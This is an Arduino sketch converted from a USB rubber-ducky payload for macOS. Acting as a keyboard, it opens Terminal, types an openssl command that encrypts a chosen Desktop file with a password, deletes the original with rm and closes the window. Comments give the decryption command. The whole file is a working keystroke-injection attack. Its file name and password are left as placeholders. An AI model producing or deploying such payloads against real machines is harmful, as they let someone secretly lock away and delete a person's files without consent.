// Generated with <3 by Dckuino.js !

#include "Keyboard.h"
void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // Code Begins Here

  // This script encrypts a file of your choice on the desktop (can change path)
  // The encrypted file will be named "ENCRYPTED.enc"
  // then it removes the original file.
  // Replace "<  >" with the correct file name & choose any password you'd like.
  // Must include file type in the file name. Example (.pdf .txt .doc .mp4)
  // To decrypt the file and return it to its original state enter the command below
  // Must include file type in the name. Example (.pdf .txt .doc)
  // password must be the same as when you encrypted
  // openssl enc -aes-256-cbc -d -in ~/Desktop/ENCRYPTED.enc -out ~/Desktop/<FILE NAME HERE.pdf> -pass pass:<PASSWORD HERE>
  // Title: File Encryption
  // Author: Narsty
  // Target: MacOS
  // Version: 1.0
  // Category: Obscurity
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("terminal");

  delay(1000);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("openssl enc -aes-256-cbc -salt -in ~/Desktop/<FILE NAME HERE.pdf> -out ~/Desktop/ENCRYPTED.enc -pass pass:<PASSWORD HERE>");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("rm ~/Desktop/<FILE NAME HERE.pdf>");

  delay(1000);

  typeKey(KEY_RETURN);

  delay(250);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();

  // Ending stream
  Keyboard.end();
}

/* endless loop */
void loop() {}